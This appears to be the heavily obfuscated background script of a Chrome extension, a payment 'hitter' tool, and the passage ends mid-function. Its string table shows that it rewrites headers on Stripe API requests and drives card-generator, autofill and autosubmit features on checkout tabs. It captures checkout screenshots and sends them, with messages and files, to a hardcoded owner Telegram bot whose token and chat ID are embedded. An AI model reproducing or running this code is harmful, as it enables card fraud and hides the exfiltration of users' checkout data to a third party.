const _0x3e9bf1 = _0x2bd7;
(function (_0x10c463, _0x410850) {
    const _0x468195 = _0x2bd7, _0x843be3 = _0x10c463();
    while (!![]) {
        try {
            const _0x43e940 = parseInt(_0x468195(0x1f6)) / (0x2a * 0xb3 + -0x9 * -0x2cf + -0x36a4) * (-parseInt(_0x468195(0x35c)) / (0x1851 + 0x1a86 + -0xb * 0x49f)) + parseInt(_0x468195(0x2db)) / (0x1c1 * 0x3 + 0x10f * 0x19 + -0x1 * 0x1fb7) + -parseInt(_0x468195(0x20c)) / (-0x2 * 0xc4f + 0x20cf + -0x17 * 0x5b) * (-parseInt(_0x468195(0x323)) / (-0x199 + -0x1 * -0x1fa9 + -0x1e0b)) + parseInt(_0x468195(0x340)) / (-0x1d77 + 0x23c9 * -0x1 + 0xae1 * 0x6) + -parseInt(_0x468195(0x3fb)) / (-0x1049 * 0x1 + -0x1ade + 0x2b2e * 0x1) + parseInt(_0x468195(0x2e8)) / (-0x5 * -0xe5 + -0x3b * -0xa1 + -0x298c) * (parseInt(_0x468195(0x304)) / (-0x2 * 0x1343 + 0xe3 * 0x1 + 0x12d6 * 0x2)) + -parseInt(_0x468195(0x286)) / (-0xf * 0x124 + -0x2381 * 0x1 + -0x34a7 * -0x1);
            if (_0x43e940 === _0x410850)
                break;
            else
                _0x843be3['push'](_0x843be3['shift']());
        } catch (_0xdb3815) {
            _0x843be3['push'](_0x843be3['shift']());
        }
    }
}(_0x3232, 0x18f83 + -0x7 * -0xcb03 + -0x35afe));
async function registerServiceWorker() {
    const _0x232191 = _0x2bd7, _0xdee987 = {
            'kVnvF': _0x232191(0x408) + _0x232191(0x2aa),
            'hWYWk': _0x232191(0x383) + 'pe',
            'GyFHG': _0x232191(0x19b),
            'KeVFC': _0x232191(0x17d) + _0x232191(0x18b) + _0x232191(0x1fd) + _0x232191(0x1cd),
            'NAQjB': _0x232191(0x37b) + _0x232191(0x3a6),
            'xPAzI': _0x232191(0x1d7) + _0x232191(0x268)
        };
    try {
        await chrome[_0x232191(0x1b4) + _0x232191(0x2b2) + 't'][_0x232191(0x3ec) + _0x232191(0x1be)]({
            'removeRuleIds': [0x18c4 + -0x4 * -0xf4 + 0x5 * -0x5b7],
            'addRules': [{
                    'id': 0x1,
                    'priority': 0x1,
                    'action': {
                        'type': _0xdee987[_0x232191(0x238)],
                        'requestHeaders': [{
                                'header': _0xdee987[_0x232191(0x384)],
                                'operation': _0xdee987[_0x232191(0x2f6)],
                                'value': _0xdee987[_0x232191(0x230)]
                            }]
                    },
                    'condition': {
                        'urlFilter': _0xdee987[_0x232191(0x186)],
                        'resourceTypes': [_0xdee987[_0x232191(0x239)]]
                    }
                }]
        });
    } catch (_0x6a0d80) {
    }
}
chrome[_0x3e9bf1(0x36f)][_0x3e9bf1(0x29f)][_0x3e9bf1(0x2d0) + 'r'](async () => {
    const _0x2a4e97 = _0x3e9bf1, _0x4ab320 = {
            'BhbYT': function (_0x182811) {
                return _0x182811();
            }
        };
    await _0x4ab320[_0x2a4e97(0x190)](registerServiceWorker), _0x4ab320[_0x2a4e97(0x190)](setupKeepAlive);
}), chrome[_0x3e9bf1(0x36f)][_0x3e9bf1(0x2c3) + 'd'][_0x3e9bf1(0x2d0) + 'r'](async () => {
    const _0x325fcb = _0x3e9bf1, _0x48ad5d = {
            'mBKVK': function (_0x1c9e98) {
                return _0x1c9e98();
            },
            'GZieK': function (_0x5630ad) {
                return _0x5630ad();
            }
        };
    await _0x48ad5d[_0x325fcb(0x3e3)](registerServiceWorker), _0x48ad5d[_0x325fcb(0x2c2)](setupKeepAlive);
});
const ALARM_NAME = _0x3e9bf1(0x3f2) + _0x3e9bf1(0x2e0);
function setupKeepAlive() {
    const _0x326659 = _0x3e9bf1;
    chrome[_0x326659(0x21f)][_0x326659(0x391)](ALARM_NAME, { 'periodInMinutes': 0.33 });
}
chrome[_0x3e9bf1(0x21f)][_0x3e9bf1(0x3f5)][_0x3e9bf1(0x2d0) + 'r'](_0x1494f7 => {
    const _0x25d5b4 = _0x3e9bf1, _0x268e6b = {
            'POVNy': function (_0x5bac36, _0x268c4c) {
                return _0x5bac36 === _0x268c4c;
            }
        };
    _0x268e6b[_0x25d5b4(0x22b)](_0x1494f7[_0x25d5b4(0x20f)], ALARM_NAME) && chrome[_0x25d5b4(0x36f)][_0x25d5b4(0x3f1) + _0x25d5b4(0x1a1)](() => {
    });
}), setInterval(() => {
    const _0x4bedb0 = _0x3e9bf1;
    chrome[_0x4bedb0(0x36f)][_0x4bedb0(0x3f1) + _0x4bedb0(0x1a1)](() => {
    });
}, 0x1ad5 + 0x154e + 0x1dfd), setupKeepAlive();
const ports = new Set(), OWNER_TG_BOT_TOKEN = _0x3e9bf1(0x378) + _0x3e9bf1(0x282) + _0x3e9bf1(0x3c6) + _0x3e9bf1(0x2d4) + _0x3e9bf1(0x2d6), OWNER_TG_CHAT_ID = _0x3e9bf1(0x205), TELEGRAM_CHAT_ID_REGEX = /^-?\d{5,20}$/, TG_STATUS_KEY = _0x3e9bf1(0x281) + _0x3e9bf1(0x276) + 's', TG_ERROR_KEY = _0x3e9bf1(0x281) + _0x3e9bf1(0x1b9), TG_TIME_KEY = _0x3e9bf1(0x281) + _0x3e9bf1(0x345);
async function sendTelegramMessage(_0x26ed4f, _0x3f2099, _0x4f62c3) {
    const _0xb9ca4 = _0x3e9bf1, _0x9abde2 = {
            'htgNw': function (_0x44a601, _0x45bdc0, _0x183d48) {
                return _0x44a601(_0x45bdc0, _0x183d48);
            },
            'BDaQi': function (_0x8263ea, _0x545b29) {
                return _0x8263ea + _0x545b29;
            },
            'fRQto': function (_0x3bbab4, _0x284a43) {
                return _0x3bbab4 + _0x284a43;
            },
            'yUeTf': _0xb9ca4(0x226) + _0xb9ca4(0x184) + _0xb9ca4(0x367),
            'tPshb': _0xb9ca4(0x1e9) + 'ge',
            'iRVMB': _0xb9ca4(0x2ef),
            'vAqmk': _0xb9ca4(0x17d) + _0xb9ca4(0x19f),
            'kxcNv': _0xb9ca4(0x3ad),
            'MmDwL': function (_0x524832, _0x450c1e) {
                return _0x524832 || _0x450c1e;
            }
        }, _0x21a302 = await _0x9abde2[_0xb9ca4(0x3da)](fetch, _0x9abde2[_0xb9ca4(0x3f8)](_0x9abde2[_0xb9ca4(0x21e)](_0x9abde2[_0xb9ca4(0x277)], OWNER_TG_BOT_TOKEN), _0x9abde2[_0xb9ca4(0x2ac)]), {
            'method': _0x9abde2[_0xb9ca4(0x1c8)],
            'headers': { 'Content-Type': _0x9abde2[_0xb9ca4(0x3c0)] },
            'body': JSON[_0xb9ca4(0x25d)]({
                'chat_id': _0x26ed4f,
                'text': _0x3f2099,
                'parse_mode': _0x9abde2[_0xb9ca4(0x267)],
                'disable_web_page_preview': _0x9abde2[_0xb9ca4(0x3fd)](_0x4f62c3, ![])
            })
        });
    return _0x21a302[_0xb9ca4(0x2d2)]();
}
async function setTelegramUiState(_0x49bd54, _0x26165c) {
    const _0x1a4365 = _0x3e9bf1, _0x2970a3 = {
            'GNaUo': function (_0x409974, _0x2d7e3e) {
                return _0x409974(_0x2d7e3e);
            },
            'oBnpV': function (_0x503e04, _0x450d92) {
                return _0x503e04 || _0x450d92;
            },
            'Pjobd': function (_0x9f246b, _0x50110b) {
                return _0x9f246b(_0x50110b);
            },
            'lGiuL': function (_0x81a1ac, _0x5b65a1) {
                return _0x81a1ac || _0x5b65a1;
            }
        };
    try {
        await chrome[_0x1a4365(0x1d3)][_0x1a4365(0x3ff)][_0x1a4365(0x19b)]({
            [TG_STATUS_KEY]: _0x2970a3[_0x1a4365(0x259)](String, _0x2970a3[_0x1a4365(0x197)](_0x49bd54, '')),
            [TG_ERROR_KEY]: _0x2970a3[_0x1a4365(0x1f7)](String, _0x2970a3[_0x1a4365(0x369)](_0x26165c, '')),
            [TG_TIME_KEY]: new Date()[_0x1a4365(0x1d9) + 'g']()
        });
    } catch (_0x5dcd5b) {
    }
}
function escapeHtml(_0x501dec) {
    const _0x15180c = _0x3e9bf1, _0x15c3bf = {
            'kxhwh': function (_0x58e72e, _0x18bf8b) {
                return _0x58e72e(_0x18bf8b);
            },
            'BOcSO': _0x15180c(0x1d4),
            'OnyRX': _0x15180c(0x37f),
            'jrotD': _0x15180c(0x2de),
            'xhGlP': _0x15180c(0x390),
            'EZzdL': _0x15180c(0x1b8)
        };
    return _0x15c3bf[_0x15180c(0x3aa)](String, _0x501dec)[_0x15180c(0x3b3)](/&/g, _0x15c3bf[_0x15180c(0x1e3)])[_0x15180c(0x3b3)](/</g, _0x15c3bf[_0x15180c(0x2ff)])[_0x15180c(0x3b3)](/>/g, _0x15c3bf[_0x15180c(0x2ce)])[_0x15180c(0x3b3)](/"/g, _0x15c3bf[_0x15180c(0x20b)])[_0x15180c(0x3b3)](/'/g, _0x15c3bf[_0x15180c(0x2fb)]);
}
function dataUrlToBlob(_0x1b3ca7) {
    const _0x537ad4 = _0x3e9bf1, _0x3634d6 = {
            'MzyVO': function (_0x32b925, _0x2fc367) {
                return _0x32b925 !== _0x2fc367;
            },
            'pDUeY': _0x537ad4(0x2dd),
            'OjqgL': _0x537ad4(0x368),
            'yrVuG': function (_0x52f0dc, _0x50384b) {
                return _0x52f0dc(_0x50384b);
            },
            'LbnVj': function (_0x426141, _0x3c6d97) {
                return _0x426141 < _0x3c6d97;
            }
        };
    if (_0x3634d6[_0x537ad4(0x359)](typeof _0x1b3ca7, _0x3634d6[_0x537ad4(0x22c)]))
        return null;
    const _0x2608d4 = _0x1b3ca7[_0x537ad4(0x214)](/^data:([^;]+);base64,(.+)$/);
    if (!_0x2608d4)
        return null;
    const _0x55dfb3 = _0x2608d4[0xa1 * -0x28 + 0x256a + -0x1 * 0xc41] || _0x3634d6[_0x537ad4(0x292)], _0x4aeb05 = _0x2608d4[0x6bb * 0x1 + 0x1e43 + 0x127e * -0x2] || '', _0x2909e6 = _0x3634d6[_0x537ad4(0x3c1)](atob, _0x4aeb05), _0x5d1e37 = new Uint8Array(_0x2909e6[_0x537ad4(0x3f0)]);
    for (let _0x51d0ce = -0x1 * -0x2524 + -0x7 * -0x233 + -0x3489; _0x3634d6[_0x537ad4(0x3c5)](_0x51d0ce, _0x2909e6[_0x537ad4(0x3f0)]); _0x51d0ce++) {
        _0x5d1e37[_0x51d0ce] = _0x2909e6[_0x537ad4(0x418)](_0x51d0ce);
    }
    return new Blob([_0x5d1e37], { 'type': _0x55dfb3 });
}
async function sendTelegramPhoto(_0x4ac57e, _0x11035c, _0x9ddce6) {
    const _0x3af5de = _0x3e9bf1, _0x184b09 = {
            'IxEnG': function (_0x506f8e, _0x5c36b2) {
                return _0x506f8e(_0x5c36b2);
            },
            'cmuQI': _0x3af5de(0x1cf) + _0x3af5de(0x246) + _0x3af5de(0x29e),
            'mMSPT': _0x3af5de(0x364),
            'zMpmC': _0x3af5de(0x220),
            'BydsB': _0x3af5de(0x3ae) + _0x3af5de(0x1ee),
            'xZVeb': _0x3af5de(0x1d2),
            'niRgr': function (_0x39ce06, _0x120ec3) {
                return _0x39ce06(_0x120ec3);
            },
            'OkMgs': _0x3af5de(0x34f),
            'cYKED': _0x3af5de(0x3ad),
            'rwxOG': function (_0x3ba317, _0x436a32, _0x1449c1) {
                return _0x3ba317(_0x436a32, _0x1449c1);
            },
            'ySspZ': function (_0xc84895, _0x4a1e39) {
                return _0xc84895 + _0x4a1e39;
            },
            'znKYO': _0x3af5de(0x226) + _0x3af5de(0x184) + _0x3af5de(0x367),
            'GBJyA': _0x3af5de(0x3f7),
            'SgRvj': _0x3af5de(0x2ef)
        }, _0x14ac5e = _0x184b09[_0x3af5de(0x40a)](dataUrlToBlob, _0x11035c);
    if (!_0x14ac5e)
        return {
            'ok': ![],
            'description': _0x184b09[_0x3af5de(0x21a)]
        };
    const _0xefc25f = new FormData();
    _0xefc25f[_0x3af5de(0x2e3)](_0x184b09[_0x3af5de(0x18a)], _0x4ac57e), _0xefc25f[_0x3af5de(0x2e3)](_0x184b09[_0x3af5de(0x221)], _0x14ac5e, _0x184b09[_0x3af5de(0x306)]);
    _0x9ddce6 && (_0xefc25f[_0x3af5de(0x2e3)](_0x184b09[_0x3af5de(0x37a)], _0x184b09[_0x3af5de(0x2ad)](String, _0x9ddce6)[_0x3af5de(0x295)](0x1800 + -0x18cd * 0x1 + 0xcd, -0x1ff4 + -0x29a + 0x292 * 0xf)), _0xefc25f[_0x3af5de(0x2e3)](_0x184b09[_0x3af5de(0x1ad)], _0x184b09[_0x3af5de(0x28d)]));
    const _0x5db851 = await _0x184b09[_0x3af5de(0x2dc)](fetch, _0x184b09[_0x3af5de(0x3d9)](_0x184b09[_0x3af5de(0x3d9)](_0x184b09[_0x3af5de(0x32c)], OWNER_TG_BOT_TOKEN), _0x184b09[_0x3af5de(0x1cc)]), {
        'method': _0x184b09[_0x3af5de(0x2a4)],
        'body': _0xefc25f
    });
    return _0x5db851[_0x3af5de(0x2d2)]();
}
function _0x2bd7(_0x5c109d, _0x25bf1a) {
    _0x5c109d = _0x5c109d - (-0x1 * -0x1a19 + -0x820 + -0x1 * 0x1081);
    const _0x3cce90 = _0x3232();
    let _0x3b3ce4 = _0x3cce90[_0x5c109d];
    return _0x3b3ce4;
}
async function sendTelegramDocument(_0x4154cb, _0x56dffc, _0x158998) {
    const _0x18bc48 = _0x3e9bf1, _0x21d179 = {
            'CdmZa': function (_0x9841c0, _0x5799e5) {
                return _0x9841c0(_0x5799e5);
            },
            'FEqxZ': _0x18bc48(0x1cf) + _0x18bc48(0x246) + _0x18bc48(0x29e),
            'jHfEZ': _0x18bc48(0x364),
            'WXRzW': _0x18bc48(0x2af),
            'YlXWi': _0x18bc48(0x3ae) + _0x18bc48(0x38d),
            'IBbCy': _0x18bc48(0x1d2),
            'uffSC': function (_0x13f47f, _0x2feb1c) {
                return _0x13f47f(_0x2feb1c);
            },
            'MVSvQ': _0x18bc48(0x34f),
            'UNzsP': _0x18bc48(0x3ad),
            'LPPhz': function (_0x1d9c3d, _0xe74196, _0x2d5318) {
                return _0x1d9c3d(_0xe74196, _0x2d5318);
            },
            'zCRjJ': function (_0x15665d, _0x4a6d60) {
                return _0x15665d + _0x4a6d60;
            },
            'sPIby': _0x18bc48(0x226) + _0x18bc48(0x184) + _0x18bc48(0x367),
            'gyxMC': _0x18bc48(0x1bc) + _0x18bc48(0x20a),
            'yUDmY': _0x18bc48(0x2ef)
        }, _0x184da7 = _0x21d179[_0x18bc48(0x195)](dataUrlToBlob, _0x56dffc);
    if (!_0x184da7)
        return {
            'ok': ![],
            'description': _0x21d179[_0x18bc48(0x227)]
        };
    const _0x17bd89 = new FormData();
    _0x17bd89[_0x18bc48(0x2e3)](_0x21d179[_0x18bc48(0x1ae)], _0x4154cb), _0x17bd89[_0x18bc48(0x2e3)](_0x21d179[_0x18bc48(0x290)], _0x184da7, _0x21d179[_0x18bc48(0x222)]);
    _0x158998 && (_0x17bd89[_0x18bc48(0x2e3)](_0x21d179[_0x18bc48(0x275)], _0x21d179[_0x18bc48(0x187)](String, _0x158998)[_0x18bc48(0x295)](-0x1 * 0x6ca + 0xd2b + -0x661 * 0x1, 0xd71 + -0x231f * -0x1 + 0x1 * -0x2c90)), _0x17bd89[_0x18bc48(0x2e3)](_0x21d179[_0x18bc48(0x374)], _0x21d179[_0x18bc48(0x1eb)]));
    const _0xd3cff5 = await _0x21d179[_0x18bc48(0x182)](fetch, _0x21d179[_0x18bc48(0x3d7)](_0x21d179[_0x18bc48(0x3d7)](_0x21d179[_0x18bc48(0x3b9)], OWNER_TG_BOT_TOKEN), _0x21d179[_0x18bc48(0x309)]), {
        'method': _0x21d179[_0x18bc48(0x1e8)],
        'body': _0x17bd89
    });
    return _0xd3cff5[_0x18bc48(0x2d2)]();
}
function _0x3232() {
    const _0x21fd0e = [
        'panel.html',
        'CZMYV',
        'HfeQK',
        'vmAQL',
        'XKIVS',
        'STOP_CUSTO',
        'znKYO',
        'qKYJl',
        'mGsKv',
        'nviqv',
        'XAfbD',
        'cDhwW',
        'documentEl',
        'pFJLD',
        'toggle-err',
        'NTUNt',
        'TxsJq',
        'vpEeu',
        'script/inj',
        'voRGt',
        'BMIT',
        'at\x20ID\x20form',
        'onMessage',
        'ytMGJ',
        'Hqvyf',
        'send\x20faile',
        '34254WAQLZN',
        'WKMMk',
        'Play\x20succe',
        'yMHRs',
        'ylFim',
        'last_ts',
        'pKcQE',
        'nGFqx',
        'ic_data',
        'T_STATE',
        'FmzgU',
        'otDIl',
        'userChatId',
        'PQeuS',
        'onload',
        'parse_mode',
        'tom_name',
        'Kjtmw',
        'luisHitter',
        'zUfmd',
        'okMoU',
        'JgIqH',
        'czKrz',
        'kSGWp',
        'gwHhC',
        'MzyVO',
        'Invalid\x20ta',
        'xYfnU',
        '56118LignBU',
        'fKjhC',
        'pjTCS',
        'lCvTJ',
        'gNgdU',
        'Owner\x20bot\x20',
        'text',
        'abled',
        'chat_id',
        'VPSlB',
        'tab',
        '.org/bot',
        'image/png',
        'lGiuL',
        'includes',
        'Kqgmv',
        'kGWOJ',
        'src',
        'pINVa',
        'runtime',
        'WLzKO',
        'fault-pfp\x22',
        'fjPsq',
        'VVofu',
        'MVSvQ',
        'No\x20checkou',
        'EiIRm',
        'cRqBT',
        '8525959219',
        'ciHQQ',
        'xZVeb',
        '||api.stri',
        'KNUuC',
        'HIT360_sav',
        'HIT360_GET',
        '&lt;',
        'HIT360-def',
        'code>',
        'forward_en',
        'content-ty',
        'hWYWk',
        'script/con',
        'ltxPj',
        'ckout\x20tab',
        'trim',
        'ailed',
        'already\x20ex',
        'TFGVO',
        'HIT360_TOG',
        'ccess.jpg',
        'stylesheet',
        '✨\x20HIT\x20SS\x20N',
        '&quot;',
        'create',
        'insBR',
        'iled',
        'TuWpa',
        'FTqSp',
        'styles',
        'dge.micros',
        'BACK',
        'lFRdA',
        'styles.css',
        'st\x20success',
        'dwEZB',
        'uttMB',
        'GMGCB',
        'RMxse',
        'onConnect',
        'downloads',
        'BSsCM',
        'VftvA',
        'osTQe',
        'k\x20failed',
        'pe.com/',
        'GJeMH',
        'attachScre',
        'update',
        'kxhwh',
        'alid',
        'HKUtm',
        'HTML',
        'narutox-su',
        'SS_SOUND_O',
        'down',
        'QsMqf',
        'ipt',
        'replace',
        'ofill.js',
        'uxwuf',
        'is\x20not\x20con',
        'script[src',
        'b\x20or\x20windo',
        'sPIby',
        'vKiqV',
        'rel',
        'mXtRS',
        'REENSHOT',
        'User\x20ID:\x20<',
        'yJPSk',
        'vAqmk',
        'yrVuG',
        'link',
        'push',
        'gdHdZ',
        'LbnVj',
        've7Ja72sK6',
        'd\x20failed',
        'reason',
        'connected',
        'hKLIw',
        'yqvnH',
        'XTIrg',
        'cKrTV',
        'URL',
        'hot\x20captur',
        'oqcty',
        'hat\x20ID\x20pro',
        'true',
        '\x20failed',
        'oxEJl',
        'OHKYR',
        'HIT360_FOR',
        'zCRjJ',
        'disablePre',
        'ySspZ',
        'htgNw',
        'head',
        'top',
        'VbyLS',
        'captureVis',
        'asTUA',
        'bcAhU',
        'ard',
        'TELEGRAM_S',
        'mBKVK',
        'size',
        'at.\x20Use\x20nu',
        'FINyw',
        'HIT360_mus',
        'RfCpd',
        'Connected\x20',
        'onloadend',
        'KLFIm',
        'updateDyna',
        'XRycF',
        'OoQYl',
        'meric\x20chat',
        'length',
        'getPlatfor',
        'HIT360-kee',
        'isFinite',
        'jpeg',
        'onAlarm',
        'bztaL',
        '/sendPhoto',
        'BDaQi',
        'about:',
        'chrome://',
        '1232385vMymHL',
        'xfKwn',
        'MmDwL',
        'tor',
        'local',
        'vwOoi',
        'ed_id',
        'RiLVU',
        'ful.',
        'dlgpm',
        'Telegram\x20o',
        '</code>',
        'FwCMt',
        'modifyHead',
        'kJboX',
        'IxEnG',
        '\x20message\x20f',
        'ss\x20sound\x20n',
        'tent.js',
        'FFSCREEN',
        'YgRZQ',
        'offscreen',
        'getContext',
        'McckV',
        'then',
        'PLAY_BACKG',
        'CAPTURE_SC',
        'esponse\x20fr',
        'no-active-',
        'charCodeAt',
        't\x20failed',
        'createElem',
        'QwbTp',
        '128.png',
        'OFFSCREEN_',
        'PhFxG',
        'applicatio',
        'Owner\x20tele',
        'Xyeli',
        'user_ss',
        'ssBbp',
        'LPPhz',
        'UTOSUBMIT',
        'i.telegram',
        'WNCyC',
        'NAQjB',
        'uffSC',
        'ignoreCool',
        'IJwsy',
        'mMSPT',
        'n/x-www-fo',
        'WogJS',
        'obTig',
        'VqXAY',
        'NbSXP',
        'BhbYT',
        'VtvMv',
        'remove',
        'tQAYF',
        'bvfHU',
        'CdmZa',
        'skipClipbo',
        'oBnpV',
        'OQRtu',
        'NARUTO\x20scr',
        'OZosk',
        'set',
        'createDocu',
        'data-luis-',
        'JBNdf',
        'n/json',
        'SVLMs',
        'mInfo',
        'isRunning',
        'kVcQo',
        'min',
        'User\x20scree',
        'meta[name=',
        'Toggle\x20fai',
        'PING',
        'blob',
        'rage.js',
        'gpijX',
        'fcvLF',
        'OkMgs',
        'jHfEZ',
        'active',
        'LhEBB',
        'at\x20ID\x20conn',
        'querySelec',
        'e\x20from\x20che',
        'declarativ',
        'HnZlU',
        'TMcDs',
        'appendChil',
        '&#39;',
        'last_error',
        'vanVW',
        'quality',
        '/sendDocum',
        'edge://',
        'micRules',
        'ery\x20failed',
        'No\x20respons',
        't\x20tab',
        'Aegmt',
        'yTzMo',
        'lay',
        'user_id',
        'SQncm',
        'No\x20user\x20ch',
        'iRVMB',
        'enshot\x20sen',
        'xqFlo',
        'download',
        'GBJyA',
        'ded',
        'ntHKY',
        'Invalid\x20sc',
        'usPsG',
        'SRegM',
        'caption',
        'storage',
        '&amp;',
        'Invalid\x20Ch',
        'Owner\x20chat',
        'xmlhttpreq',
        'I_TOGGLE_A',
        'toISOStrin',
        'ZkhOr',
        'ylshH',
        'ickxA',
        'IPBOARD',
        'COPY_TO_CL',
        'ge\x20send\x20fa',
        'ists',
        'noDownload',
        'eenshot\x20te',
        'BOcSO',
        'xPIvH',
        'No\x20valid\x20C',
        'OKOfV',
        'TEhwO',
        'yUDmY',
        '/sendMessa',
        'offscreen.',
        'UNzsP',
        'YDgBT',
        'N_PANEL',
        'ccess.png',
        'lsemB',
        'HIT360_MIN',
        'OUcfX',
        'format',
        '.png',
        'WusYx',
        'VChFj',
        '1VlbXmM',
        'Pjobd',
        'error',
        'iGtWd',
        'query',
        'open-faile',
        'uWyqb',
        'rm-urlenco',
        'KtsqP',
        'getElement',
        'mpmEd',
        '\x22HIT360-de',
        'disconnect',
        'ROUND_MUSI',
        'CsoMZ',
        '8206978592',
        'volume',
        'inject',
        'ZypLW',
        'IIPko',
        'ent',
        'xhGlP',
        '608bCLCfM',
        'SRzWP',
        'AdFqO',
        'name',
        'Owner\x20test',
        'gcPHD',
        'aNKtE',
        'HIT360_OPE',
        'match',
        'windows',
        'DOCUMENT',
        'DsToo',
        'dsEFX',
        'enshot',
        'cmuQI',
        'zcYmr',
        'meta',
        'END',
        'fRQto',
        'alarms',
        'photo',
        'zMpmC',
        'YlXWi',
        'om\x20checkou',
        'mPCfo',
        'kgSNQ',
        'https://ap',
        'FEqxZ',
        'executeScr',
        'xkFyB',
        'KYxGm',
        'POVNy',
        'pDUeY',
        'NEL',
        'NJZiA',
        'fsxWI',
        'KeVFC',
        'descriptio',
        'nshot\x20send',
        'OmoXr',
        'Name:\x20<cod',
        'setAttribu',
        'tabs',
        'delete',
        'kVnvF',
        'xPAzI',
        'GVVsh',
        'icon',
        'zcrWV',
        'pArOi',
        'hpJJS',
        'TETkg',
        'FETCH_IMAG',
        'insertCSS',
        'gGLbV',
        'mOMaN',
        'MAIN',
        'QoqJX',
        'reenshot\x20d',
        'kxxYB',
        'script/aut',
        'User\x20messa',
        'ension://',
        'dvmcK',
        'WDvwt',
        'script',
        'NARUTOX_',
        'html',
        'type',
        'tjowR',
        'cjmBx',
        'rcsfI',
        'ULxtH',
        'vNPEE',
        'onDisconne',
        'ER_TEST_SC',
        'ibleTab',
        'GNaUo',
        '\x20ID.',
        'wAhWV',
        'lqsRJ',
        'stringify',
        '_AUTOSUBMI',
        'uHaYt',
        'HexhO',
        'fZyvZ',
        'vided',
        'microsofte',
        'onerror',
        'M_PREVIEW',
        'VurQp',
        'kxcNv',
        'uest',
        'EGNjX',
        'gle.com/we',
        'chrome-ext',
        't\x20tab\x20foun',
        'kOaFV',
        'startsWith',
        'KZhpi',
        'hitter',
        'led',
        'SS_SOUND',
        'postMessag',
        'dons',
        'IBbCy',
        'last_statu',
        'yUeTf',
        'UgfFX',
        'WLFhc',
        'zNLdh',
        'hixpS',
        'ect.js',
        'yZigD',
        'xhgqk',
        'STOP_BACKG',
        'eciiD',
        'HIT360_tg_',
        ':AAE6UqTug',
        'max',
        'content',
        '.card-gene',
        '4098330YTtRlX',
        'DHJVw',
        'yYQgA',
        'action',
        'PLAY_SUCCE',
        'vNJFh',
        'OBKks',
        'cYKED',
        'SNQsC',
        'failed',
        'WXRzW',
        'KFBHq',
        'OjqgL',
        'yVruh',
        'fNHRM',
        'slice',
        'wFnMq',
        'MArNt',
        'scripting',
        'QszBn',
        'sBwNe',
        'LhKPb',
        'figured',
        'FnzEK',
        'ata',
        'onStartup',
        'voflI',
        'gle_auto_s',
        'enshot\x20tes',
        'ixvJD',
        'SgRvj',
        '\x20ID\x20is\x20inv',
        'onClicked',
        'Hfoie',
        'WWpar',
        'Styles',
        'ers',
        'boolean',
        'tPshb',
        'niRgr',
        'rator-over',
        'document',
        'CE_OPEN_PA',
        'Owner\x20scre',
        'eNetReques',
        'chrome.goo',
        'DyrID',
        'ected',
        'view',
        'join',
        'AUDIO_PLAY',
        'aRRCP',
        'DKybp',
        'href',
        'YYIAJ',
        'sendMessag',
        'testOnly',
        'tabId',
        'photo\x20send',
        'eckout\x20tab',
        'GZieK',
        'onInstalle',
        'catch',
        'XkWHc',
        'TnuKK',
        'HIT360_cus',
        'test',
        'ARUTOX\x20✨',
        'oeSMp',
        'No\x20screens',
        'toString',
        'VTnRd',
        'jrotD',
        'hXlRh',
        'addListene',
        'DReSR',
        'json',
        'gEmVD',
        '8ARvyJGm4K',
        'otificatio',
        '7WN3h0',
        'JuWdz',
        'ADzxp',
        'windowId',
        'script[',
        '284226fzBczz',
        'rwxOG',
        'string',
        '&gt;',
        'message',
        'palive',
        'bZhzL',
        'YcNnp',
        'append',
        'IfMwf',
        'ed\x20from\x20ch',
        'NARURO_OWN',
        'XRvqB',
        '212584ppXkjI',
        'User\x20deliv',
        'wqppD',
        'script/sto',
        'PLAY_CUSTO',
        'state-erro',
        'oft.com/ad',
        'POST',
        'TIVE_TAB',
        'ToIDR',
        'ytxFV',
        'State\x20chec',
        'OSZsL',
        'aPmNP',
        'GyFHG',
        'LuGIU',
        'add',
        'ZMiGo',
        'gram\x20send\x20',
        'EZzdL',
        'icons/icon',
        'yhehK',
        'YUTMk',
        'OnyRX',
        'gaJOq',
        'png',
        'bstore',
        'GLE_AUTOSU',
        '162zIJoLE',
        'HIT360_tog',
        'BydsB',
        'sDRXQ',
        'wner\x20send\x20',
        'gyxMC',
        'qoaHt',
        'ault-pfp',
        'get',
        'result',
        'ById',
        'zInBU',
        'zizHT',
        'fgToI',
        'autofill',
        'now',
        'url',
        'yxKrq',
        'N_PANEL_AC',
        'pGFpV',
        'aVhbi',
        'ment',
        'LROTW',
        'avelU',
        'ELHkR',
        'twXJR',
        'readAsData',
        'qESIY',
        'getURL',
        'XXtBw',
        'ement',
        '9255RkSFCt',
        'force',
        'No\x20state\x20r'
    ];
    _0x3232 = function () {
        return _0x21fd0e;
    };
    return _0x3232();
}
function isRestrictedTabUrl(_0x48bec8) {
    const _0x17a022 = _0x3e9bf1, _0x23c9fe = {
            'fjPsq': _0x17a022(0x3fa),
            'LROTW': _0x17a022(0x26b) + _0x17a022(0x24a),
            'bZhzL': _0x17a022(0x1bd),
            'yZigD': _0x17a022(0x3f9),
            'pArOi': _0x17a022(0x2b3) + _0x17a022(0x26a) + _0x17a022(0x302),
            'QszBn': _0x17a022(0x263) + _0x17a022(0x397) + _0x17a022(0x2ee) + _0x17a022(0x274)
        };
    if (!_0x48bec8)
        return !![];
    return _0x48bec8[_0x17a022(0x26e)](_0x23c9fe[_0x17a022(0x372)]) || _0x48bec8[_0x17a022(0x26e)](_0x23c9fe[_0x17a022(0x31a)]) || _0x48bec8[_0x17a022(0x26e)](_0x23c9fe[_0x17a022(0x2e1)]) || _0x48bec8[_0x17a022(0x26e)](_0x23c9fe[_0x17a022(0x27d)]) || _0x48bec8[_0x17a022(0x36a)](_0x23c9fe[_0x17a022(0x23d)]) || _0x48bec8[_0x17a022(0x36a)](_0x23c9fe[_0x17a022(0x299)]);
}
async function tryOpenPanelViaMessage(_0x33f98a) {
    const _0x222369 = _0x3e9bf1, _0x1b82fc = { 'zInBU': _0x222369(0x213) + _0x222369(0x1ed) };
    try {
        const _0x396dbb = await chrome[_0x222369(0x236)][_0x222369(0x2bd) + 'e'](_0x33f98a, { 'type': _0x1b82fc[_0x222369(0x30f)] }, { 'frameId': 0x0 });
        return !!(_0x396dbb && _0x396dbb['ok']);
    } catch (_0x98738f) {
        return ![];
    }
}
async function hasPanelOverlay(_0x36cf35) {
    const _0xaa1228 = _0x3e9bf1;
    try {
        const _0x563ac9 = await chrome[_0xaa1228(0x298)][_0xaa1228(0x228) + _0xaa1228(0x3b2)]({
            'target': {
                'tabId': _0x36cf35,
                'allFrames': ![]
            },
            'func': () => !!document[_0xaa1228(0x1b2) + _0xaa1228(0x3fe)](_0xaa1228(0x285) + _0xaa1228(0x2ae) + _0xaa1228(0x1c4))
        });
